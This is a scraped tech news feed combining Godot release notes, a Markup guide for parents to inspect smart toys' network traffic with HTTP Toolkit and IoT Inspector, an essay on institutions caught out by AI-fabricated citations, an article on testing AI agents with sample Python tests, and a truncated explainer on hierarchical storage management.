Moreover, with this newfound knowledge over the depths of , Hilderin also further improved that first project import experience to make the FileSystem dock more responsive while resources are being scanned (GH-93064).Editor window state is now persistentAnother long-awaited quality of life improvement was implemented by Samuele Panzeri in GH-76085, adding support for keeping track of the editor window’s state (fullscreen/windowed mode, screen, size, position) to restore it across sessions. This should be particularly welcome for users with big monitors or multi-monitor setups who want a different default behavior than fullscreen on the first screen.A few popular quality of life improvements have been implemented by Yuri Rubinsky for the visual shader editor:New material preview side dock (GH-94215).Drag & drop of Mesh to create MeshEmitter in visual shaders (GH-93017).Initial Android editor support for XR devicesThanks to Godot’s unique feature of having an editor made with the engine itself, we’ve been able to bring the Godot editor to unconventional places, such as the web and Android devices. Building upon the latter, Fredia Huya-Kouadio completed the proof of concept started by Bastiaan Olij years ago, to add support for using the Android editor in an XR context using OpenXR (GH-96624)! You can test the current version by sideloading the APK, currently supported on Meta Quest 3 or Quest Pro.There are too many exciting changes to list them all here, but here’s a curated selection:2D: Implement multiple occlusion polygons within each TileSet occlusion layer (GH-93029).2D: Enable  to “guess” the amount of rows and columns of a sprite sheet when loading it for the first time (GH-95475).3D: Add option to bake a mesh from animated skeleton pose (GH-85018).3D: Add full customization of 3D navigation controls (GH-85331).3D: Fix  debug collision shapes being visible in editor (GH-86699).3D: Add ability to hide editor transform gizmo (GH-87793).Animation: Update AnimationPlayer in real-time when keyframe properties change (GH-91599).Animation: Optimize AnimationMixer blend process (GH-92838).Animation: Allow keying properties when selecting multiple nodes (GH-92842).Animation: Allow jumping to previous/next keyframe in animation player (GH-96013).Animation: Use antialiased line drawing in animation Bezier editor (GH-96559).Audio: ResourceImporterWAV: Enable QOA compression by default (GH-95815).Audio: Fix leak when using audio samples instead of streams (GH-96572).Buildsystem: Add support for compiling with VS clang-cl toolset (GH-92316).Core: Ability to convert native engine types to JSON and back (GH-92656).Core: Batch of fixes for  and  (GH-94169).Core: WorkerThreadPool: Fix end-of-yield logic potentially leading to deadlocks (GH-96225).Core: ResourceLoader: Add thread-aware resource changed mechanism (GH-96593).Editor: Remember editor window mode, screen, size and position on restart (GH-76085).Editor: Fix script overwriting with external editor (GH-96007).Editor: Disable export template downloading in offline mode (GH-96331).Editor: FileSystem: Add option to show some unsupported files in the dock (GH-96603).Export: Allow adding custom export platforms using scripts / GDExtension (GH-90782).Export: Android Editor: Add support for exporting platform binaries (GH-93526).Export: macOS: Use per-architecture min.

While engine maintainers try their best to ensure that each preview snapshot and release candidate is stable, this is by definition a pre-release piece of software. Be sure to make frequent backups, or use a version control system such as Git, to preserve your projects in case of corruption or data loss.Typed dictionaries: Different typed keys/values are wrongly allowed when using the  operator (GH-96772). A fix is already in the pipeline for the next dev snapshot.Windows: Detecting newly added assets (GH-96828), export variables (GH-96810), and the last modification dates for projects (GH-96812) is not working in this snapshot, due to a toolchain bug exposed by a recent FileAccess change on Windows. This was already fixed by GH-74830.\
With every release we accept that there are going to be various issues, which have already been reported but haven’t been fixed yet. See the GitHub issue tracker for a complete list of known bugs.As a tester, we encourage you to open bug reports if you experience issues with this release. Please check the existing issues on GitHub first, using the search function with relevant keywords, to ensure that the bug you experience is not already known.\
In particular, any change that would cause a regression in your projects is very important to report (e.g. if something that worked fine in previous 4.x releases, but no longer works in this snapshot).]]></content:encoded></item><item><title>How You Can Test Your Kids&apos; Smart Toys For Privacy</title><link>https://hackernoon.com/how-you-can-test-your-kids-smart-toys-for-privacy?source=rss</link><author>The Markup</author><category>tech</category><pubDate>Sat, 24 Jan 2026 16:00:13 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[The Markup, now a part of CalMatters, uses investigative reporting, data analysis, and software engineering to challenge technology to serve the public good. Sign up forKlaxon, a newsletter that delivers our stories and tools directly to your inbox.\
It’s a new era in entertainment for kids. Everywhere you look, new toys and devices are marketed toward children with smart features. Gift guides and store shelves tout Bluetooth- and Wi-Fi-enabled devices for kids, which promise an iPad-native generation a better way to play.\
But are those toys secure? And precisely what data is being handed over when a kid is using these toys?\
There are real reasons for concern: This year, the FTC hit Amazon with a $25 million fine because Alexa devices were storing recordings and transcripts of children’s voices, which the company retained even after parents requested deletion of the data. It’s just one of the many devices that could be recording your children’s speech or tracking their behavior.\
The Markup is looking into what other toys collect private data on your children. The FBI recommends parents do their own research on digital toy privacy but offers no advice on how to actually do so. We’re here to help.\
The first step is to read the privacy policy for a toy and, if applicable, its companion app. In particular, pay attention to what information is being tracked, how the info is used, and what partners that info is shared with. It might also include a section about the toy company’s compliance with the “Children’s Online Privacy Protection Act” for protecting children under 13.\
The next step is to figure out whether your device uses Wi-Fi, Bluetooth, or both; that information should be displayed on the toy’s box or in the instruction manual. A Wi-Fi-enabled toy will likely communicate with your wireless router to send data to the internet (though, in limited circumstances, the toy may also communicate with other devices on the same Wi-Fi network). Meanwhile, a Bluetooth toy will send data to another smart device, such as a smartphone, which may then relay that data to the internet using Wi-Fi or cellular data.\
Then, grab your computer (and your smartphone if your toy uses Bluetooth). Our instructions assume you’re using macOS and iOS, though the tools below also have Windows or Android (for HTTP Toolkit) alternatives. We have not tested these instructions on Linux, but they should work there as well.\
To capture traffic from a Bluetooth device, you will need to use a man-in-the-middle proxy that intercepts and monitors the network traffic between the device you want to monitor and the internet. We recommend using HTTP Toolkit, which has a nice interface and works on most operating systems.\
To find out what your toy is up to, follow the steps below (modified from the instructions here). Ensure your smartphone and computer are connected to the same Wi-Fi network. Find your computer’s local network IP address by going to System Settings > Network > Wi-Fi. Then select the Details button (see below). Note the IP address listed there; you’ll be entering it into your smartphone in Step 7.Go to System Settings > Network > Wi-Fi. Then select the Details button, shown below.Note the IP address, circled below. Go to your Application folder and open HTTP Toolkit. If you have an Apple Silicon chip, your computer may ask you to install Rosetta, which is an Apple compatibility layer for older Intel software. Go ahead and click “Install.”You may get an alert that says, “‘HTTP Toolkit’ is an app downloaded from the Internet. Are you sure you want to open it?” Yes, it’s OK to open it. Once HTTP Toolkit is open, you should automatically be on the Intercept HTTP page. Scroll down a bit and select the “Anything” box. Now we’ll configure our smartphone to use the proxy. Go to Settings > Wi-Fi. Then select the ⓘ icon next to the Wi-Fi network you’re connected to. Scroll down the screen and select Configure Proxy. Select the Manual option. Under “Server,” enter the IP address you saved from Step 3. Under “Port,” enter “8000,” which is HTTP Toolkit’s default port setting (as long as you didn’t change anything). You don’t need to toggle “Authentication.” Make sure you change your phone’s proxy setting back to “Off” after you’re finished monitoring your toy. Otherwise, you won’t be able to connect to the internet. (We’ll remind you again at the end of these steps.) HTTP Toolkit shows data from every app on your phone all at once, so if you’re running too many apps on your device, it may be difficult to see which traffic is coming from the toy. Before you go further, we recommend closing any apps by swiping up from the bottom edge of your phone and swiping up again on each open app. Then, go to Settings > Battery and turn on Low Battery Mode, which pauses any apps from updating or sending traffic in the background. We’ll remind you to turn Low Battery Mode back to “Off” after you’re done monitoring your toy. Finally, go to Settings > Privacy & Security. Turn off Tracking (the second option on the screen), then scroll to the bottom of the screen to find Analytics & Improvements and Apple Advertising. Turn those settings off as well. We recommend keeping these settings off after you’re finished checking the toy. Return to HTTP Toolkit on your computer, and download the root certificate by selecting “Export CA certificate.” Internet traffic is usually encrypted between your computer and the destination server, but the root certificate allows HTTP Toolkit to act as the “destination” for your traffic and intercept it. Email or AirDrop the certificate to your iPhone.If using email, open with the built-in Mail app, which is the only iOS mail app that can open certificates. If using AirDrop, accept the request.If you get a “Choose a Device” prompt, select “iPhone.” You should see a “Profile Downloaded” message on your phone after sending the certificate. Close this. On your iPhone, go to Settings > General > VPN & Device Management. You should see “HTTP Toolkit CA” in the “Downloaded profile” section. Click on it, then click “Install” in the top right corner. You may be prompted to enter your passcode. Click “Install” again.Then, go to Settings > General > About > Certificate Trust Settings and enable "Full Trust" for the HTTP Toolkit certificate. Head back to HTTP Toolkit on your computer and switch to the “View” tab on the left. You should see a bunch of text flying by on your screen. Each line of text is a piece of data that’s being sent by your phone to the internet, including from iOS and any apps you have running on your phone that may be doing things in the background. As a test, open an internet browser on your phone and navigate to any website (themarkup.org, for example). If your window looks like this, congrats! Click on a line to get more details in the right window pane. For example, in the image above, the third line from the bottom shows that Safari downloaded an image from the Markup homepage.

We tested these instructions on the “Encanto” karaoke machine and monitored the network traffic as we configured the toy using its EZ Link app. The app asked us to enter a birthday and choose which music streaming service we wanted to use. The app is very basic: When you push the big button on the front of the karaoke machine, it sends a notification to your phone with a link to the “Encanto” soundtrack on the streaming service you’ve chosen.\
We then tried all the features on the toy, including playing music, using the microphone, and recording to a USB drive. Overall, HTTP Toolkit finds … nothing! It turns out this app is very secure and doesn’t send any data. Nice going, eKids.Wi-Fi-enabled toys connect directly to your wireless network, so they require a different method of tracking. There are expensive ways to track Wi-Fi toys, including buying a separate adapter, but we’ll show you how to track these toys for free using IoT Inspector, a research tool that allows you to monitor the network traffic of IoT devices on your home Wi-Fi.\
Caveat: IoT Inspector may have bugs. Running it might interfere with your network, and, in the worst case, could require you to restart your router. Not every toy is guaranteed to function correctly while IoT Inspector is running.\
⚠️ Do not run IoT Inspector on any network that you do not own. It is only safe to run IoT Inspector on your home Wi-Fi.Download and run IoT Inspector on your computer. If you are using Windows, you can download the zip file here, extract it, double-click “IoT Inspector,” and then skip to Step 7. If you are on a Mac, open the Terminal app. It can be found by opening Finder, navigating to Applications > Utilities, and opening “Terminal.” Install macOS’s command line tools by copying **xcode-select --install** into the Terminal window, and press your  (or  key. This might take some time to install. If the tools are already installed, update your software in System Settings before continuing. Next, we will download and configure IoT inspector. Copy and paste the following block of code into the Terminal and hit Return. Start IoT Inspector by pasting the following block of code into Terminal and hitting Return. Your Terminal may ask you for your password. If it does, type your computer account password into the Terminal—it won’t show you typing, but it works!—and press Return. Copy the “Network URL” that appears in the Terminal, and paste it into your web browser. Agree to the terms and warnings associated with running IoT Inspector. Optionally, you may consent to share your network data to the IoT Inspector research project at NYU. See the Privacy Policy for more info on the data it collects. Once IoT Inspector is open, you will see a list of devices running on your home network. Each entry lists the device’s local IP address (for internet connectivity) and MAC address (akin to a hardware serial number). For example, the second device in the image below has a local IP address of  and a MAC address ending in . IoT Inspector will try to identify the manufacturer of devices on your network. For example, the second device in the image above is guessed to be an Apple device. However, this guessing is not perfect. If you have never connected the toy to your home network, finding the toy is as simple as connecting the device and clicking the new device that appears at the bottom of the list. Otherwise, you will need to identify the toy by various means. The toy might display a MAC or local IP address in its settings or on a connected phone app that will help you identify the device. If not, try performing actions on the toy and see if one of the devices in IoT Inspector starts reporting more traffic. Once you’ve identified the toy, uncheck “Inspect” for all other devices on the network so that you are only monitoring the toy you care about. When you click on the toy, you will see all traffic—though unlike Bluetooth devices, IoT Inspector will only show you the domains being contacted, not exactly what data is being sent.To quit IoT Inspector, click “Quit IoT Inspector” in the bottom left. If this does not work, go back to your Terminal and hit Command + Q or click “Terminal” in the top left of your screen and then “Quit Terminal.”When you are finished monitoring your toy, we recommend going to IoT Inspector’s “Settings” and clicking “Reset IoT Inspector” to clear the list of devices. Otherwise, you might see old devices in the list the next time you run IoT Inspector. If you opted into sharing your network data with NYU researchers, you may also delete your shared data here. To rerun IoT Inspector later, open Terminal and run the following lines of code: Then, go back to Step 6 and continue the instructions from there, skipping Step 7 since you’ve already agreed to the terms and warnings.With some toys, you may find that they are sending data to strange domains. Try to look for correlations between your actions and data. For example, if you turn on a toy’s camera and see large amounts of data being sent while the camera is running, this suggests the toy is sending camera data. All of this analysis should be combined with reading the toy’s manual thoroughly and experimenting with the toy’s various actions to understand its full capabilities.\
We tried these instructions on a Tamagotchi Uni and found that the toy only sends data to aws.amazon.com. The Uni uses Amazon AWS to manage its online connectivity. When starting up the Uni for the first time, the toy only asks for a nickname and birthday. We could not confirm further what data is being sent to Amazon.]]></content:encoded></item><item><title>How PopWheels helped a food cart ditch generators for e-bike batteries</title><link>https://techcrunch.com/2026/01/24/how-popwheels-helped-a-food-cart-ditch-generators-for-e-bike-batteries/</link><author>Tim De Chant</author><category>tech</category><pubDate>Sat, 24 Jan 2026 16:00:00 +0000</pubDate><source url="https://techcrunch.com/">TechCrunch</source><content:encoded><![CDATA[PopWheels realized its battery swapping network could be used for more than food delivery workers who need to charge their e-bikes.

On January 16, the chief constable of West Midlands Police in the United Kingdom stepped down after  that an AI tool had been used to help draft an official safety assessment that cited a football match that never took place. The report was used to justify banning supporters of Maccabi Tel Aviv from attending a Europa League match against Aston Villa in November 2025. Embedded in the assessment was a reference to a  between Maccabi Tel Aviv and West Ham that did not exist.\
Under questioning, the chief constable acknowledged that part of the document had been drafted using . Political attention followed fast: the home secretary said she no longer had  in his leadership, and the region’s police and crime commissioner announced a public accountability hearing. What initially looked like a technical error quickly escalated into a leadership crisis. How could an official-sounding, finished-looking document enter a high-stakes decision process without clear verification?\
Much of the public debate has focused on bias, judgment, and individual responsibility, but the episode points to a structural problem that has been developing for a few years now.From human diligence to synthetic diligenceFor decades, modern institutions relied on an implicit assumption: if a document existed - especially one that looked formal, reasoned, structured - someone had spent time producing it. Reports, legal filings, safety assessments, and policy briefings were costly to generate and even low-quality work required hours of human attention. That cost function created an informal but reliable signal of accountability.\
But Generative AI breaks that assumption.\
Draft-quality pieces can now be produced in seconds, arguments and citations included, and look convincing even when the underlying claims are entirely fabricated or misinterpreted. The issue in this case is not that automated systems sometimes hallucinate; humans make mistakes, too. The issue is that institutions have no scalable way to distinguish between text produced by a person reasoning through a problem and text produced by a model optimised to mimic that reasoning.\
As the cost of producing authoritative-sounding text begins to approach zero, institutions begin to deal with synthetic work faster than they can verify it. Safety assessments, legal briefs, student essays, internal reports, and consultancy deliverables all start to look finished long before anyone has actually done any of the work implied by their appearance.\
That fluency substitutes human judgment and verification becomes the new bottleneck.Where failures are already visibleThe West Midlands case is not an isolated one and similar failures are already forcing adjustments across institutions: courts, universities, government bodies, professional services, and even journalism have all been caught out.Judges in several jurisdictions have sanctioned lawyers for submitting filings containing AI-generated, non-existent case law. In the United States, the  case led to fines after attorneys relied on fabricated citations produced by ChatGPT and legal analysis judged “gibberish.” In response, some federal judges, like Judge Brantly Starr in Texas, have introduced standing orders requiring lawyers to  that they have personally reviewed and verified any AI-assisted content. Courts in England and Wales have issued  that submitting fictitious AI-generated case law may amount to professional misconduct or contempt. These measures are not bans on AI tools; they are attempts to re-establish a clear line of human accountability in the court record.Higher education institutions  a similar verification problem. Many have concluded that detecting AI use in take-home assignments is . One student said to ABC News it’s difficult, explaining: "We're looking at the same piece of legislation, we're quoting the same cases, we're looking at the same issues,” while another gave up: ‘"I just decided to take the punishment because I was simply too scared to argue further."Some departments have reintroduced handwritten or supervised exams, expanded oral assessments, and shifted evaluation into in-person settings. Oxford’s Faculty of Medieval and Modern Languages  closed-book, handwritten exams. The University of Sydney  unauthorised AI use as an academic integrity violation and has tightened assessment design accordingly. Regulators in Australia have explicitly  universities to move away from assessment formats where authorship cannot be reliably established.Governments are beginning to formalise disclosure and auditability requirements for algorithmic tools. In the UK, the Algorithmic Transparency Recording Standard ( requires public bodies to document and publish information about the automated systems they deploy. The government’s  emphasises accountability, human oversight, and transparency in public-sector AI use. And, at the European level, the  introduces obligations to disclose AI-generated or manipulated content in certain contexts. These frameworks are early attempts to ensure that official decisions can later be scrutinised - not just for what they say, but for how they were produced.The private sector is encountering the same problem, often with direct financial consequences. In Australia, Deloitte produced a  for the Department of Employment and Workplace Relations that was later found to contain  references and made-up court quotes. The firm acknowledged that parts of the report were drafted using a generative AI toolchain and refunded a portion of its fee after the errors were exposed. The model behaved as designed: it generated plausible text. What failed was the workflow. AI-assisted output passed through internal checks and into a government decision environment without adequate human verification.Similar episodes have surfaced elsewhere. Media outlets including CNET and MSN have retracted AI-generated articles containing  or . Air Canada was  after its website chatbot gave a customer incorrect information about refund eligibility. In academic publishing, papers have been found to include  linked to automated text generation.\
Across these cases, we see a consistent pattern. Institutions assumed that efficiently produced text was a reliable signal of underlying work. But that assumption no longer holds.Why institutions are adding frictionThe emerging responses - manual attestation, in-person assessment, disclosure requirements, limits on undeclared AI use - can look like resistance to innovation. It is not. It is an attempt to restore a basic institutional function we still rely on: linking text to responsibility.\
When verification capacity is scarce, adding friction is rational rather than Luddite. If an organisation can generate more documents than anyone can realistically check, it accumulates decisions that no one can truly own. Over time, that erodes internal trust and external legitimacy: colleagues stop believing that reports reflect real expertise. Courts, regulators, and the public lose confidence that official records rest on accountable judgment.\
The West Midlands episode illustrates this dynamic clearly. The political fallout was not caused solely by an incorrect reference. It was caused by the revelation that a document carrying real consequences had entered an official process without anyone being able to say, with confidence, who - if anyone - had verified it.Generative AI does not simply make institutions faster. It changes what is scarce: production is now abundant, verification is not.And that shift requires a redesign of institutional workflows. Provenance - how a document was produced, who edited it, who checked it, and who stands behind it - now needs to become explicit rather than assumed. Some categories of work will need clear boundaries where identifiable human authorship remains non-negotiable. Others may accommodate automation, but only within review limits that match available oversight.\
This is not a temporary adjustment. Synthetic diligence is cheap and convincing, and failures like the one in West Midlands are likely to continue to happen. Each event will test public trust - in AI tools and, more importantly, in institutions and their safeguards.\
The institutions that adapt will be those that accept a slower, more verification-centric mode of operation in high-stakes contexts. Those that don’t will continue to produce documents that look finished - until the moment they are forced to explain who actually did the work.:::info

They work beautifully because they are powered by models like GPT, Claude Opus, etc. which are trained on massive amounts of data. However, the key problem that is not talked about widely is about testability of these agents. You don’t want your AI agent to hallucinate in production, or do drastic things like dropping production tables or get stuck in infinite retry loops.The traditional software testing playbook of unit tests, integration tests, end to end tests with known inputs and expected outputs fundamentally breaks down for agentic AI systems. When the system’s behavior is non-deterministic, or when the state space is infinite, or when the correct output is subjective, you would need a different approach.At DocuSign and across the industry, you are building agents that orchestrate complex workflows like analyzing documents, making decisions, calling APIs, handling errors and adapting to user feedback. These systems fail in ways that predetermined test cases cannot catch.Why Traditional Testing Fails for AgentsLet’s take a traditional API endpoint as an example: give input X, it returns output Y. You write a test asserting this. The test is deterministic, repeatable and either passes or fails. This approach works because the mapping from inputs to outputs is known and stable.Now consider an agent that is tasked with “schedule a meeting with engineering team next week”. The agent would:Interpret “next week” based on current dateIdentify who are in the “engineering team”Check availability on calendarsConfirm completion and return successAt every step, your agent makes a decision based on context and available tools. The exact sequence of API calls is not predetermined. It comes from agent’s reasoning. Two runs on the same input might take completely different paths and still be correct.A test case that asserts “the agent calls  exactly twice, then calls  with these parameters” would not work. Your agent might check calendars once or multiple times if there are conflicts. It might batch send invitations or individually. These are implementation details and not correctness criterion.Traditional testing assumes deterministic state machines, however, agents are non-deterministic. The gap is inevitable.So how do you test something you can't fully specify? The answer is to stop testing execution paths and start testing properties, invariants, and outcomes. This requires thinking in three distinct layers, each with its own testing strategy.The Three Layers of Agent TestingEffective agent testing requires thinking in layers.The agent’s tools are essentially the functions it can call and they must work deterministically. If  sometimes returns wrong data, the agent will make wrong decisions irrespective of the reasoning.Testing of the tool is traditional unit testing:def test_get_calendar():
    calendar = get_calendar("alice@example.com")
    assert calendar.owner == "alice@example.com"
    assert all(isinstance(e, Event) for e in calendar.events)
    assert all(e.start < e.end for e in calendar.events)
This layer is necessary but insufficient. Perfect tools do not guarantee correct agent behavior. They just eliminate one source of failure.Layer 2: Reasoning VerificationThe reasoning of the agent i.e. how it decides which tools to call and in what order, cannot be tested with assertions about the tool sequences. But the invariants and properties can be tested regardless of the path taken. tests the properties that must always be true.For the meeting scheduler example above, agent must not:create conflicting meetingssend multiple invitations per participantThese invariants don’t care about whether the agent calls  serially or in parallel, but do care about things like double-booking someone:def test_no_double_booking_invariant(agent, test_scenario):
    result = agent.schedule_meeting(test_scenario)

    for participant in result.participants:
        calendar = get_calendar(participant)
        events_at_time = [e for e in calendar.events 
                         if overlaps(e, result.scheduled_time)]
        assert len(events_at_time) == 1, \
            f"{participant} double-booked at {result.scheduled_time}"
 generates random valid inputs and verifies:from hypothesis import given, strategies as st

@given(
    participants=st.lists(st.emails(), min_size=2, max_size=10),
    duration=st.integers(min_value=15, max_value=120),
    timeframe=st.datetimes()
)
def test_meeting_scheduling_properties(agent, participants, duration, timeframe):
    result = agent.schedule_meeting(
        participants=participants,
        duration=duration,
        preferred_time=timeframe
    )

    # Properties that must hold
    assert result.duration == duration
    assert set(result.participants) == set(participants)
    assert result.scheduled_time >= datetime.now()
    assert len(result.invitations_sent) == len(participants)
You are testing the outcome and not the path. The agent can reason however it wants, as long as the result satisfies the properties.Layer 3: Behavior EvaluationBehavior of agents is subjective and non-deterministic. “Did the agent write a helpful email?” depends on context.For these, you need evaluation rather than testing since tests assert definite correctness but evaluations score quality.def evaluate_email_quality(agent_output, context):
    prompt = f"""
    Evaluate this email on a scale of 1-10 for:
    - Professionalism
    - Clarity
    - Completeness
    - Tone appropriateness

    Context: {context}
    Email: {agent_output}

    Return JSON with scores and brief justifications.
    """

    evaluator = LLM(model="gpt-4")
    scores = evaluator.generate(prompt)
    return scores
This is controversial but is increasingly common. The key thing is that the evaluator model should be powerful as compared to the model being evaluated. You don’t want to evaluate GPT-3.5 to judge GPT-4. This trades subjective human judgement for LLMs but we are gaining automation and consistency.For critical workflows, human evaluation is still necessary. So, instead of asking them to judge, you can give them specific criteria:evaluation_rubric = {
    "correctness": "Did the agent accomplish the stated goal?",
    "efficiency": "Did it use the minimum necessary API calls?",
    "error_handling": "Did it gracefully handle failures?",
    "user_experience": "Would a user be satisfied with this interaction?"
}

def human_eval(agent_trace, rubric):
    scores = {}
    for criterion, description in rubric.items():
        score = input(f"{description}\nScore (1-5): ")
        scores[criterion] = int(score)
    return scores
For instance, you can use this to track scores over time and judge if the system is regressing or improving.Agent Testing is Upside DownThe traditional software testing goes like like: many unit tests, fewer integration tests, few end-to-end tests. For agents, it’s the reverse. Most of the testing effort goes to end-to-end scenarios because that’s where emergent failures happen. An agent might call each tool correctly and passes unit tests, but might get stuck in a loop calling the same tool repeatedly and will fail in end-to-end test.So the testing distribution might look like: 20% tool unit tests, 30% invariant and property tests, and rest of it on end-to-end scenarios. These scenarios should cover happy paths, partial failures, ambiguous inputs and adversarial inputs.Observability is Testing in ProductionIt is impossible to test all the possible scenarios before deployment, so production monitoring becomes continuous testing playground.This can be achieved with:: Each agent action should be logged with context to reconstruct reasoning. Define metrics that indicate agent health. For example, success rate, tool call efficiency, error rate, retry rate, etc. Flag sessions with excessive tool calls or repetitive patterns suggesting loops, or high error rates. Anomalous sessions go into a review queue where humans label them as bugs or edge cases or expected behavior.Code coverage is meaningless for agents. The agent has minimal code and most of the behavior comes from LLM’s weights, which you don’t control. Every line of code could be executed and still you can have zero test coverage.What can still be measured is scenario coverage (distinct scenarios tested), tool coverage (percentage of tools called), and state coverage (system states reached). But still the state space is exponentially large to cover all of them.Testing agents resembles testing distributed systems more than libraries. You cannot prove correctness, but you can increase confidence through comprehensive scenarios, invariant testing, fault injection, monitoring and rapid iteration on observed failures.Conclusion: Testing Under UncertaintyTraditional software testing assumes that you can specify correct behavior in advance. However, agent testing assumes you cannot.You cannot write enough tests to prove that an agent works. But you can only build confidence through other things like the ones I mentioned above. This simply means shipping agents that might fail in ways you haven’t anticipated and accepting that your test suite will never give you complete coverage. This is uncomfortable but liberating since you are not trying to enumerate all possible inputs and outputs.The teams that succeed with agents won’t be those with the most test cases, but those that are operating comfortably under uncertainty, learning from failures and iterating quickly based on what they observe in production. The traditional QA testing strategy is fundamentally wrong because applying deterministic thinking to non-deterministic systems is counter-productive.]]></content:encoded></item><item><title>HSM: The Original Tiering Engine Behind Mainframes, Cloud, and S3</title><link>https://hackernoon.com/hsm-the-original-tiering-engine-behind-mainframes-cloud-and-s3?source=rss</link><author>Carl Watts</author><category>tech</category><pubDate>Sat, 24 Jan 2026 15:34:14 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[If you think “tiering” started with SSD caches and cloud storage classes… congratulations: you’ve been successfully marketed to.Hierarchical Storage Management (HSM) has been doing the same core job for decades:Keep “hot” data on fast, expensive media… push “cold” data to slower, cheaper media… and make the user mostly forget you exist—until recall latency reminds them you do.What changed over 50-ish years isn’t the . It’s the , the , the , and the **ways vendors try to rename the same thing so procurement feels like it’s buying “innovation.” 😄Hierarchical Storage Management (HSM) is the storage world’s oldest magic trick: make expensive storage look bigger by quietly moving data to cheaper tiers—without breaking the namespace. Users see the same files. Admins see fewer “disk full” tickets. Everyone pretends recall latency isn’t real until someone double-clicks a 400 GB file that’s been living its best life on deep archive.At its core, HSM is policy-driven data placement across a storage hierarchy, with some kind of  when data is accessed again. Historically that hierarchy was “fast disk → slower disk → tape/optical.” In modern stacks it’s often “hot → cool → cold → archive,” sometimes spanning on-prem, object, and cloud.The five moving parts of classic HSM (and why each matters)1) A primary tier: where “now” livesThis is the storage that must behave like storage:fast disk, SSD, high-perf NAS, scratch, or a parallel file systemlow latency and high throughputoptimized for active workflowsThis tier is  where you want decades of “just in case” to accumulate.2) Secondary tiers: where “later” livesHSM is only interesting if there’s a cheaper place to put cold data:optical or other long-retention mediaThese tiers trade performance for economics (cost/GB, power, density, longevity). The whole HSM game is deciding what belongs where and when.3) A policy engine: the brains (and the source of most arguments)Policies decide  and . Classic inputs look like: (mtime, atime, “last referenced”) (large files are prime migration candidates) (everything under /project/foo/ follows the foo rules) (user/group-based policies) (hot/warm/cold heuristics)Modern policy engines add:tags/metadata (object systems)workflow signals (job completed, project closed)compliance state (retention, legal hold)cost signals (retrieval charges, egress exposure)A good policy engine doesn’t just migrate data—it prevents you from migrating the  data and learning about it in production.4) A recall mechanism: how the illusion stays intactThis is the “don’t break users” component.In file-centric HSM, recall is often enabled by:stub files / placeholders that preserve name, size, timestamps, permissions, etc.file system hooks/events so “open()” triggers stage-back automaticallythrottling/queuing so one scan doesn’t recall the planetIn object-centric HSM/lifecycle, recall may look like:copies into a hot bucket/work areaexplicit workflow steps instead of “transparent recall”Either way, recall is where HSM becomes real. Migration is easy. Getting it back safely, predictably, and at scale is the hard part.5) A migration engine: the muscle and the traffic copsThis is what actually moves bytes and keeps the system from melting down:movers (data transfer processes/hosts)queues and prioritizationmedia managers (especially for tape/robotics)retry logic, auditing, and state trackingIf you’ve ever seen a recall storm, you already know: the migration engine isn’t just a copier. It’s the difference between “smooth tiering” and “incident ticket with your name on it.”What HSM is  (because people keep using the word wrong)is about recoverability after loss/corruption. \n HSM is about space and cost optimization through relocation.Some systems combine them, but the intent is different:HSM moves data  to free space (and expects recall to work)Backup makes additional copies for recovery (and doesn’t assume the primary copy disappears)If your “HSM” deletes primary data but you have no independent recovery story, that’s not HSM—that’s . copies hot blocks/data closer to compute while leaving the authoritative copy in place.   typically relocates entire files/objects to a different tier based on policy.Caching says: “keep a fast copy nearby.” \n HSM says: “this doesn’t belong on expensive storage anymore—move it.”They can coexist (and often should), but they solve different problems.The simplest way to think about HSMHSM is a governed lifecycle for data placement:decide what’s hot vs coldmove cold data to cheaper tierspreserve access semantics as much as practicalcontrol recall so it’s predictabletrack state so you can prove where data is and whyOld HSM did that with stubs and tape robots. \n Modern HSM does it with lifecycle rules, object metadata, and restore workflows.Same job. New interface. Same operational booby traps.HSM vs ILM: same family, different job titlesPeople mix up Hierarchical Storage Management (HSM) and Information Lifecycle Management (ILM) because vendors spent two decades using both terms as interchangeable marketing confetti. They’re related, but they are not the same thing.. It moves data between tiers.. It decides what the organization  do with data over time—and proves it did it. framing is useful here: ILM is an ongoing strategy that aligns the  of information with , , and  across the information lifecycle—not a single box you buy and plug in.The lifecycle view: ILM starts before storage gets involvedILM begins at the moment data is created or acquired and continues until final disposition. That lifecycle typically includes: (how it enters the org, what metadata/tags exist) (who can access it, performance requirements) (distribution, replication, copies, versions) (backup, snapshots, replication, integrity/fixity) (records, archives, research collections) (legal holds, privacy rules, access controls) (deletion, destruction, transfer, reclassification)HSM usually shows up in the middle of that story as the “move it to cheaper storage” execution layer—not as the policy authority deciding what’s kept, for how long, and under what legal constraints.Practical translation (the one you actually use in architecture meetings)HSM = the machinery (execution layer)HSM is the set of technical capabilities that make tiering real: /  across disk, object, tape, cloud classes and  rules to free primary storage /  workflows (stub recall, rehydrate, restore jobs) and  (throughput, throttling, prioritization) (tape libraries, volume catalogs, robotics control) (resident/offline, restore in progress, pinned, etc.)HSM answers: “Where does this data live today, and how do we move it?”ILM = the governance layer (intent + accountability)ILM is the framework that ties data handling to business and legal requirements:Retention schedules (keep 7 years, keep forever, keep until case closes) and  (prove it wasn’t altered; prove deletion) (freeze disposition and sometimes freeze movement) (public, internal, restricted, sensitive) and  (what storage class is acceptable, retrieval tolerances) (defensible deletion, transfer, or preservation) (who approves, who changes, who signs off)ILM answers: “What must happen to this data over its life, and can we prove it?”Where people go wrong: buying “ILM” as if it’s a productA lot of vendors sold “ILM” as a feature bundle. The problem is that ILM isn’t a feature, it’s a cross-cutting system of:organizational policy (records management, legal, security)operational processes (approvals, audits, exceptions, incident handling)tooling (metadata/tagging, analytics, movement engines, retention enforcement)You can buy components that support ILM, but the “ILM” part is the  and —and no vendor ships that preconfigured to match your regulatory obligations and internal politics. (If they claim they do, they’re selling you optimism.)How they fit together in a modern stackA useful way to describe it in your article:: retention, access rules, acceptable latency, cost constraints, compliance obligations.: migration, tier transitions, restore workflows, and enforcement mechanisms.**Example: \n **ILM says: “This collection must be retained for 25 years, immutable, with restores allowed but tracked, and retrieval should be under 24 hours.” \n HSM implements: “After 90 days, transition to cold/archive tier; enable restore workflow; restrict who can rehydrate; log restores; enforce immutability.”ILM is the ‘why’ and the ‘rules of the road.’ HSM is the ‘how’—the engine that moves data across tiers in a way that matches those rules, especially in file-centric and hybrid environments.A quick timeline: mainframe → open systems → HPC → clustered file → object/cloudMainframe roots (late 1970s through the 1980s): policy before it was coolMainframe HSM wasn’t born as a “nice-to-have.” It showed up because Direct Access Storage Device (DASD) was expensive, data growth was relentless, and nobody was 